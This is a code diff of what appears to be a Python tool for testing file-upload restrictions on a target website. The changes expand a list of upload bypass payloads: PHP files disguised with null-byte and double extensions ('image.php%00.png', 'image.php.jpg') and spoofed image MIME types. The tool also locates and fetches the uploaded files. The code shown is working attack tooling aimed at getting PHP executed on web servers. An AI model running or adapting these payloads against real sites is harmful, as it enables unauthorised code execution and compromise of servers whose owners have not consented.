@@ -5,6 +5,8 @@ import argparse
 import re
 import readline
 from urllib.parse import urlparse
+import os
+import binascii
 
 # ============== PAYLOAD ============== #
 main_payload = r"""
@@ -143,20 +145,22 @@ def find_uploaded_file(target_url, payload, returned_path,
             return r.text, u
         elif r.status_code == 403:
             print(f"[!] Permission denied -> {u}")
-        elif r.status_code == 404:
-            print(f"[!] No file found -> {u}")
     return None, None
 
-#===============PAYLOADS===============#
+#==========================VARIABLES==========================#
+succes = []
+hash = binascii.hexlify(os.urandom(16)).decode()
+#==========================PAYLOADS==========================#
 payloads = {
     0: {"file_name": "sample.txt", "mime": "text/plain", "content": "Ray manta upload"},
-    1: {"file_name": "image.php%00.png", "mime": "application/php", "content": "<?php echo 'Ray manta upload'; ?>"},
-    2: {"file_name": "image.php", "mime": "image/jpg", "content": "<?php echo 'Ray manta upload'; ?>"},
-    3: {"file_name": "image.php.jpg", "mime": "application/php", "content": "<?php echo 'Ray manta upload'; ?>"}
+    1: {"file_name": "image.php%00.png", "mime": "image/jpeg", "content": "<?php echo 'Ray manta upload'; ?>"},
+    2: {"file_name": "image.php", "mime": "image/jpeg", "content": "<?php echo 'Ray manta upload'; ?>"},
+    3: {"file_name": "image.php", "mime": "image/png", "content": "<?php echo 'Ray manta upload'; ?>"},
+    4: {"file_name": "image.php", "mime": "image/gif", "content": "<?php echo 'Ray manta upload'; ?>"},
+    5: {"file_name": "image.php.jpg", "mime": "application/php", "content": "<?php echo 'Ray manta upload'; ?>"}
 }
 # \xff\xd8\xff\xe0
-succes = []
-#===============COOKIES + HEADERS===============#
+#==========================COOKIES + HEADERS==========================#
 cookies = None
 headers = None
 
@@ -224,7 +228,7 @@ if args.url:
                 if content:
                     print(content)
         else:
-            print(f" File not found : {content}")
+            print(f" File not found or file error : {content}")
 
     print("\n[+] Terminé")
     print(exit_payload)
